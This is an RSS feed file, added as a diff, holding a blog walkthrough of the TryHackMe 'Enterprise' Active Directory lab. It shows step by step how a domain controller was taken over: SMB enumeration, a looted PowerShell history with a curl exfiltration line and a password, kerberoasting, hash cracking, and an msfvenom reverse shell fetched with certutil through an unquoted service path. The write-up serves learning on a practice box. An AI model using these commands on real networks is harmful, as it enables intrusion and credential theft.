@@ -1,0 +1,347 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><?xml-stylesheet href="/feed_style.xsl" type="text/xsl"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:media="https://www.rssboard.org/media-rss">
+  <channel>
+    <title>Kerberoast on Ep1cac</title>
+    <link>http://localhost:1313/tags/kerberoast/</link>
+    <description>Recent content in Kerberoast on Ep1cac</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en</language>
+    <copyright>Ep1cac</copyright>
+    <lastBuildDate>Tue, 17 Sep 2024 15:11:37 -0500</lastBuildDate><atom:link href="http://localhost:1313/tags/kerberoast/index.xml" rel="self" type="application/rss+xml" /><icon>http://localhost:1313/logo.svg</icon>
+    
+    
+    <item>
+      <title>Enterprise</title>
+      <link>http://localhost:1313/posts/enterprise/</link>
+      <pubDate>Tue, 17 Sep 2024 15:11:37 -0500</pubDate>
+      
+      <guid>http://localhost:1313/posts/enterprise/</guid>
+      <description><![CDATA[<p><img src="/img/enterprise/enterprise.png#center" alt="Enterprise"></p>
+<h3 id="description">Description</h3>
+<p><a href="https://tryhackme.com/r/room/enterprise">Enterprise</a> is a Hard difficulty Active Directory box on Tryhackme. We are in an assumed compromise scenario where our only target is a domain controller on the internal network. While privilege escalation was straightforward, there are multiple rabbit holes for initial access.</p>
+<h3 id="recon">Recon</h3>
+<p>I began my recon on the machine was a nmap scan.</p>
+<pre tabindex="0"><code># Nmap 7.94SVN scan initiated Wed Sep 18 17:50:36 2024 as: nmap -p- -A -v -oN nmap.scan -T5 10.10.62.141
+Increasing send delay for 10.10.62.141 from 0 to 5 due to 948 out of 2369 dropped probes since last increase.
+Warning: 10.10.62.141 giving up on port because retransmission cap hit (2).
+Nmap scan report for 10.10.62.141
+Host is up (0.21s latency).
+Not shown: 65506 closed tcp ports (reset)
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+80/tcp    open  http          Microsoft IIS httpd 10.0
+|_http-title: Site doesn&#39;t have a title (text/html).
+|_http-server-header: Microsoft-IIS/10.0
+| http-methods: 
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
+|_  Potentially risky methods: TRACE
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-09-18 18:02:39Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: ENTERPRISE.THM0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: ENTERPRISE.THM0., Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+| ssl-cert: Subject: commonName=LAB-DC.LAB.ENTERPRISE.THM
+| Issuer: commonName=LAB-DC.LAB.ENTERPRISE.THM
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2024-09-17T17:46:46
+| Not valid after:  2025-03-19T17:46:46
+| MD5:   12f5:c3db:b128:72f4:9f89:6a26:be7a:899d
+|_SHA-1: 2022:9e18:d0fb:90a4:ba39:9c9b:ef3c:504f:d485:d8ce
+| rdp-ntlm-info: 
+|   Target_Name: LAB-ENTERPRISE
+|   NetBIOS_Domain_Name: LAB-ENTERPRISE
+|   NetBIOS_Computer_Name: LAB-DC
+|   DNS_Domain_Name: LAB.ENTERPRISE.THM
+|   DNS_Computer_Name: LAB-DC.LAB.ENTERPRISE.THM
+|   DNS_Tree_Name: ENTERPRISE.THM
+|   Product_Version: 10.0.17763
+|_  System_Time: 2024-09-18T18:03:41+00:00
+|_ssl-date: 2024-09-18T18:03:49+00:00; +50s from scanner time.
+5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Service Unavailable
+|_http-server-header: Microsoft-HTTPAPI/2.0
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+7990/tcp  open  http          Microsoft IIS httpd 10.0
+|_http-title: Log in to continue - Log in with Atlassian account
+|_http-server-header: Microsoft-IIS/10.0
+| http-methods: 
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
+|_  Potentially risky methods: TRACE
+9389/tcp  open  mc-nmf        .NET Message Framing
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49669/tcp open  msrpc         Microsoft Windows RPC
+49670/tcp open  msrpc         Microsoft Windows RPC
+49672/tcp open  msrpc         Microsoft Windows RPC
+49674/tcp open  msrpc         Microsoft Windows RPC
+49703/tcp open  msrpc         Microsoft Windows RPC
+49707/tcp open  msrpc         Microsoft Windows RPC
+49840/tcp open  msrpc         Microsoft Windows RPC
+Aggressive OS guesses: Microsoft Windows Server 2019 (96%), Microsoft Windows 10 1709 - 1909 (93%), Microsoft Windows Server 2012 (93%), Microsoft Windows Server 2016 (92%), Microsoft Windows Vista SP1 (92%), Microsoft Windows Longhorn (92%), Microsoft Windows 10 1709 - 1803 (91%), Microsoft Windows 10 1809 - 2004 (91%), Microsoft Windows Server 2012 R2 (90%), Microsoft Windows Server 2012 R2 Update 1 (90%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 4 hops
+TCP Sequence Prediction: Difficulty=260 (Good luck!)
+IP ID Sequence Generation: Busy server or unknown class
+Service Info: Host: LAB-DC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+|_clock-skew: mean: 49s, deviation: 0s, median: 49s
+| smb2-time: 
+|   date: 2024-09-18T18:03:42
+|_  start_date: N/A
+
+TRACEROUTE (using port 554/tcp)
+HOP RTT       ADDRESS
+1   75.99 ms  10.13.0.1
+2   ... 3
+4   204.26 ms 10.10.62.141
+
+Read data files from: /usr/bin/../share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Wed Sep 18 18:03:05 2024 -- 1 IP address (1 host up) scanned in 749.00 seconds
+</code></pre><p>Even if we were not told that our target was a domain controller (per the room description), it would quickly become apparent with the discovery of DC-specific ports and services like kerberos on port 88.</p>
+<p>After identifying open services, I always look for quick wins next. I Noticed SMB anonymous access was allowed and we have read permission on several shares.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~]
+└─$ netexec smb 10.10.62.141 -u &#39;Anonymous&#39; -p &#39;&#39; --shares
+SMB         10.10.62.141    445    LAB-DC           [*] Windows 10 / Server 2019 Build 17763 x64 (name:LAB-DC) (domain:LAB.ENTERPRISE.THM) (signing:True) (SMBv1:False)
+SMB         10.10.62.141    445    LAB-DC           [+] LAB.ENTERPRISE.THM\Anonymous: 
+SMB         10.10.62.141    445    LAB-DC           [*] Enumerated shares
+SMB         10.10.62.141    445    LAB-DC           Share           Permissions     Remark
+SMB         10.10.62.141    445    LAB-DC           -----           -----------     ------
+SMB         10.10.62.141    445    LAB-DC           ADMIN$                          Remote Admin
+SMB         10.10.62.141    445    LAB-DC           C$                              Default share
+SMB         10.10.62.141    445    LAB-DC           Docs            READ            
+SMB         10.10.62.141    445    LAB-DC           IPC$            READ            Remote IPC
+SMB         10.10.62.141    445    LAB-DC           NETLOGON                        Logon server share 
+SMB         10.10.62.141    445    LAB-DC           SYSVOL                          Logon server share 
+SMB         10.10.62.141    445    LAB-DC           Users           READ            Users Share. Do Not Touch!
+</code></pre><p><code>Docs</code> and <code>Users</code> in particular appeared worth digging further into. I took a look at <code>Docs</code> first.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp]
+└─$ smbclient //10.10.62.141/Docs -U Anonymous -N
+Try &#34;help&#34; to get a list of possible commands.
+smb: \&gt; ls
+  .                                   D        0  Mon Mar 15 02:47:35 2021
+  ..                                  D        0  Mon Mar 15 02:47:35 2021
+  RSA-Secured-Credentials.xlsx        A    15360  Mon Mar 15 02:46:54 2021
+  RSA-Secured-Document-PII.docx       A    18432  Mon Mar 15 02:45:24 2021
+
+                15587583 blocks of size 4096. 9927627 blocks available
+smb: \&gt;
+</code></pre><p>There are two files, <code>RSA-Secured-Credentials.xlsx</code> and <code>RSA-Secured-Document-PII.docx</code>. These could be huge findings that allow us to breach the domain controller. I transferred the files to my attacker machine. The files were password protected, so I extracted the password hashes with <code>office2john</code> and started cracking them while I continued enumerating the machine (spoiler alert: I couldn&rsquo;t crack any of the hashes).</p>
+<p>I took a look at the Users share next. After some digging, I came across a PowerShell history file for LAB_ADMIN in <code>\LAB-ADMIN\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\</code>.</p>
+<pre tabindex="0"><code>smb: \LAB-ADMIN\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\&gt; get Consolehost_hisory.txt 
+getting file \LAB-ADMIN\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\Consolehost_hisory.txt of size 424 as Consolehost_hisory.txt (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)
+</code></pre><pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp]
+└─$ cat Consolehost_hisory.txt                                                                  
+cd C:\
+mkdir monkey
+cd monkey
+cd ..
+cd ..
+cd ..
+cd D:
+cd D:
+cd D:
+D:\
+mkdir temp
+cd temp
+echo &#34;replication:101RepAdmin123!!&#34;&gt;private.txt
+Invoke-WebRequest -Uri http://1.215.10.99/payment-details.txt
+more payment-details.txt
+curl -X POST -H &#39;Cotent-Type: ascii/text&#39; -d .\private.txt&#39; http://1.215.10.99/dropper.php?file=itsdone.txt
+del private.txt
+del payment-details.txt
+cd ..
+del temp
+cd C:\
+C:\
+exit
+</code></pre><p>We see the credentials <code>replication</code>:<code>101RepAdmin123!!</code>. I tried using the credentials. Unfortunately, it appears that the <code>replication</code> user has been deleted.</p>
+<p>We can also brute force usernames by taking advantage of the KDC&rsquo;s prompt for preauthentication for valid usernames (it returns an error if given a nonexistent username). I used <a href="https://github.com/ropnop/kerbrute">kerbrute</a>.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~]
+└─$ ~/opt/kerbrute/dist/kerbrute_linux_amd64 userenum --dc 10.10.62.141 --domain lab.enterprise.thm /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt 
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: dev (9cfb81e) - 09/18/24 - Ronnie Flathers @ropnop
+
+2024/09/18 17:47:42 &gt;  Using KDC(s):
+2024/09/18 17:47:42 &gt;   10.10.62.141:88
+
+2024/09/18 17:47:47 &gt;  [+] VALID USERNAME:       banana@lab.enterprise.thm
+2024/09/18 17:47:54 &gt;  [+] VALID USERNAME:       guest@lab.enterprise.thm
+2024/09/18 17:48:20 &gt;  [+] VALID USERNAME:       administrator@lab.enterprise.thm
+2024/09/18 17:49:53 &gt;  [+] VALID USERNAME:       cake@lab.enterprise.thm
+2024/09/18 17:50:51 &gt;  [+] VALID USERNAME:       enterprise@lab.enterprise.thm
+2024/09/18 17:51:40 &gt;  [+] VALID USERNAME:       nik@lab.enterprise.thm
+2024/09/18 17:52:34 &gt;  [+] VALID USERNAME:       Guest@lab.enterprise.thm
+2024/09/18 17:52:35 &gt;  [+] VALID USERNAME:       Administrator@lab.enterprise.thm
+2024/09/18 17:57:00 &gt;  [+] VALID USERNAME:       Banana@lab.enterprise.thm
+2024/09/18 17:57:14 &gt;  [+] VALID USERNAME:       spooks@lab.enterprise.thm
+2024/09/18 17:59:28 &gt;  [+] VALID USERNAME:       joiner@lab.enterprise.thm
+</code></pre><p>I then tried sprayed <code>101RepAdmin123!!</code> against the usernames and variations of it (e.g. <code>101RepAdmin123!</code>) against the users to no avail. ASREProasting also turned up nothing, so I had to look at other attack vectors.</p>
+<p>There are also two HTTP services running on ports 80 and 7990 that we can take a look at. While port 80 did not yield anything interesting, there is an Atlassian portal on port 7990. The login portal itself appears to be a static and unexploitable webpage, but there is a message mentioning that the org may be moving to Github.</p>
+<p><img src="/img/enterprise/atlassian.png" alt="Atlassian login portal"></p>
+<p>I have to admit, it took me way longer than I would have liked to figure out that there was an actual Github page associated with &ldquo;Enterprise-THM&rdquo; as opposed to something like a .git folder hidden in a subdirectory.</p>
+<p><img src="/img/enterprise/enterprise_github.png" alt="Enterprise-THM Github page"></p>
+<p>The Github page has a single repository that doesn&rsquo;t hold any useful information. However, there is an associated account &ldquo;Nik-enterprise-dev&rdquo; which has a repository &ldquo;mgmtScript.ps1&rdquo;. This could prove to be out lucky break.</p>
+<p><img src="/img/enterprise/nik_github.png" alt="Nik-enterprise-dev Github page"></p>
+<h3 id="foothold">Foothold</h3>
+<p>The PowerShell script takes in a username and password and gets the system information of all computers within an active directory network. While the <code>$userName</code> and <code>$userPassword</code> fields are empty, we can see that there has been more than one change pushed to this repository.</p>
+<p><img src="/img/enterprise/git_history.png" alt="mgmtScript.ps1 Repository history"></p>
+<p>We can look at the details by cloning the repository.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>git clone https://github.com/Nik-enterprise-dev/mgmtScript.ps1.git
+</span></span></code></pre></div><p>I then switched to the repository folder and ran <code>git log</code>. This shows, among others, the commit hash for each push to the repository. We can use these hashes to view changes and previous versions of the repo.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp/mgmtScript.ps1]
+└─$ git log                                                           
+commit c3c239df75fefbe7563d1d29c963ba1f01e4fe5a (HEAD -&gt; main, origin/main, origin/HEAD)
+Author: Nik-enterprise-dev &lt;80557956+Nik-enterprise-dev@users.noreply.github.com&gt;
+Date:   Sat Mar 13 20:09:16 2021 -0500
+
+    Updated things
+    
+    I accidentally added something
+
+commit bc40c9f237bfbe7be7181e82bebe7c0087eb7ed8
+Author: Nik-enterprise-dev &lt;80557956+Nik-enterprise-dev@users.noreply.github.com&gt;
+Date:   Sat Mar 13 18:57:40 2021 -0500
+
+    Create SystemInfo.ps1
+    
+    Gets System Info from each computer on the domain
+</code></pre><p>In one of his commits, Nik comments that he &ldquo;accidentally added something&rdquo;. We can view the details by supplying the commit hash.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp/mgmtScript.ps1]
+└─$ git show c3c239df75fefbe7563d1d29c963ba1f01e4fe5a
+commit c3c239df75fefbe7563d1d29c963ba1f01e4fe5a (HEAD -&gt; main, origin/main, origin/HEAD)
+Author: Nik-enterprise-dev &lt;80557956+Nik-enterprise-dev@users.noreply.github.com&gt;
+Date:   Sat Mar 13 20:09:16 2021 -0500
+
+    Updated things
+    
+    I accidentally added something
+
+diff --git a/SystemInfo.ps1 b/SystemInfo.ps1
+index bc7ca27..5ae7576 100644
+--- a/SystemInfo.ps1
++++ b/SystemInfo.ps1
+@@ -1,6 +1,6 @@
+ Import-Module ActiveDirectory
+-$userName = &#39;nik&#39;
+-$userPassword = &#39;&lt;nik&#39;s password&gt;&#39;
++$userName = &#39;&#39;
++$userPassword = &#39;&#39;
+ $psCreds = ConvertTo-SecureString $userPassword -AsPlainText -Force
+ $Computers = New-Object -TypeName &#34;System.Collections.ArrayList&#34;
+ $Computer = $(Get-ADComputer -Filter * | Select-Object Name)
+</code></pre><p>We see that Nik had accidentally pushed his credentials and the final commit removed them from the repository. I tried <code>nik</code>:<code>&lt;nik's password&gt;</code> against a number of services, but the account does not have sufficient privileges to gain a foothold through common services like RDP or SMB. However, since it is a domain account, we can also perform other attacks such as kerberoasting.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp]
+└─$ impacket-GetUserSPNs lab.enterprise.thm/nik:&#39;&lt;nik&#39;s password&gt;&#39; -dc-ip 10.10.62.141 -request -outputfile kerberoast.txt
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+ServicePrincipalName  Name       MemberOf                                                     PasswordLastSet             LastLogon                   Delegation 
+--------------------  ---------  -----------------------------------------------------------  --------------------------  --------------------------  ----------
+HTTP/LAB-DC           bitbucket  CN=sensitive-account,CN=Builtin,DC=LAB,DC=ENTERPRISE,DC=THM  2021-03-12 01:20:01.333272  2021-04-26 15:16:41.570158             
+
+
+
+[-] CCache file is not found. Skipping...
+</code></pre><p>We get a hash for <code>bitbucket</code>. Now to crack it&hellip;</p>
+<pre tabindex="0"><code>hashcat -a 0 kerberoast.txt /usr/share/wordlists/rockyou.txt
+</code></pre><p>Eventually, it cracks.</p>
+<h3 id="privilege-escalation">Privilege Escalation</h3>
+<p>With the new credentials for the <code>bitbucket</code> service account, I connected to the domain controller through RDP.</p>
+<pre tabindex="0"><code>xfreerdp /v:10.10.62.141 /u:bitbucket /p:&lt;bitbucket&#39;s password&gt; /cert-ignore
+</code></pre><p>After some enumeration, I found an unquoted service path.</p>
+<pre tabindex="0"><code>C:\Users\bitbucket&gt;wmic service get name,pathname | findstr /i /v &#34;C:\Windows\\&#34; | findstr /i /v &#34;&#34;&#34;
+Name                                      PathName                                                                      
+AtlassianBitbucket                        C:\Atlassian\Bitbucket\7.11.1\bin\bserv64.exe //RS//AtlassianBitbucket        
+AtlassianBitbucketElasticsearch           C:\Atlassian\Bitbucket\7.11.1\elasticsearch\bin\elasticsearch-service-x64.exe //RS//AtlassianBitbucketElasticsearch
+LSM                                                                                                                     
+NetSetupSvc                                                                                                             
+zerotieroneservice                        C:\Program Files (x86)\Zero Tier\Zero Tier One\ZeroTier One.exe               
+</code></pre><p>Unquoted service paths are a vulnerability that arises due to the way Windows runs its binaries. Say we have a program <code>C:\Users\Public\My Programs\New Program.exe</code>, Windows will first try to execute <code>C:\Users\Public\My.exe</code> followed by <code>C:\Users\Public\My Program.exe</code>, <code>C:\Users\Public\My Program\New.exe</code>, and finally <code>C:\Users\Public\My Programs\New Program.exe</code> because of the spaces in and the path and lack of enclosing quotes. <code>zerotieroneservice</code> is vulnerable to this type of exploit.</p>
+<p>Importantly, the service binary is owned by <code>NT AUTHORITY\SYSTEM</code>.</p>
+<pre tabindex="0"><code>C:\Users\bitbucket&gt;dir /q &#34;C:\Program Files (x86)\Zero Tier\Zero Tier One\ZeroTier One.exe&#34;
+ Volume in drive C has no label.
+ Volume Serial Number is 7CD9-A0AE
+
+ Directory of C:\Program Files (x86)\Zero Tier\Zero Tier One
+
+12/05/2014  11:52 AM         9,594,056 NT AUTHORITY\SYSTEM    ZeroTier One.exe
+               1 File(s)      9,594,056 bytes
+               0 Dir(s)  40,566,411,264 bytes free
+</code></pre><p>User permissions for <code>C:\Program Files (x86)\Zero Tier</code>:</p>
+<pre tabindex="0"><code>C:\Users\bitbucket&gt;icacls &#34;C:\Program Files (x86)\Zero Tier&#34;
+C:\Program Files (x86)\Zero Tier BUILTIN\Users:(OI)(CI)(W)
+                                 NT SERVICE\TrustedInstaller:(I)(F)
+                                 NT SERVICE\TrustedInstaller:(I)(CI)(IO)(F)
+                                 NT AUTHORITY\SYSTEM:(I)(F)
+                                 NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
+                                 BUILTIN\Administrators:(I)(F)
+                                 BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
+                                 BUILTIN\Users:(I)(RX)
+                                 BUILTIN\Users:(I)(OI)(CI)(IO)(GR,GE)
+                                 CREATOR OWNER:(I)(OI)(CI)(IO)(F)
+                                 APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
+                                 APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(OI)(CI)(IO)(GR,GE)
+                                 APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)
+                                 APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(OI)(CI)(IO)(GR,GE)
+
+Successfully processed 1 files; Failed processing 0 files
+</code></pre><p><code>bitbucket</code>, as a member of <code>BUILTIN\Users</code>, has write access to the <code>C:\Program Files (x86)\Zero Tier</code> directory through <code>BUILTIN\Users</code>. It is therefore possible to write a &ldquo;Zero.exe&rdquo; binary have the zerotieroneservice execute it.</p>
+<pre tabindex="0"><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.13.48.55 LPORT=31337 -f exe -o Zero.exe
+</code></pre><p>Now to transfer it to our target&hellip;</p>
+<pre tabindex="0"><code>python3 -m http.server 80
+</code></pre><pre tabindex="0"><code>C:\Program Files (x86)\Zero Tier&gt;certutil -urlcache -f http://10.13.48.55/Zero.exe Zero.exe
+</code></pre><p>Next, I checked the status of <code>zerotieroneservice</code>.</p>
+<pre tabindex="0"><code>C:\Program Files (x86)\Zero Tier&gt;sc query zerotieroneservice
+
+SERVICE_NAME: zerotieroneservice
+        TYPE               : 10  WIN32_OWN_PROCESS
+        STATE              : 1  STOPPED
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x7d0
+</code></pre><p>The service is not running. All that needs to be done now is to start the service and we should receive a shell as <code>NT AUTHORITY\SYSTEM</code> (Don&rsquo;t forget to start a listener first).</p>
+<pre tabindex="0"><code>C:\Users\bitbucket&gt;sc start zerotieroneservice
+</code></pre><pre tabindex="0"><code>┌──(kali㉿kali)-[~]
+└─$ rlwrap nc -nvlp 31337
+listening on [any] 31337 ...
+connect to [10.13.48.55] from (UNKNOWN) [10.10.146.30] 49930
+Microsoft Windows [Version 10.0.17763.1817]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32&gt;whoami
+whoami
+nt authority\system
+
+C:\Windows\system32&gt;
+</code></pre>]]></description>
+      
+    </item>
+    
+    
+  </channel>
+</rss>
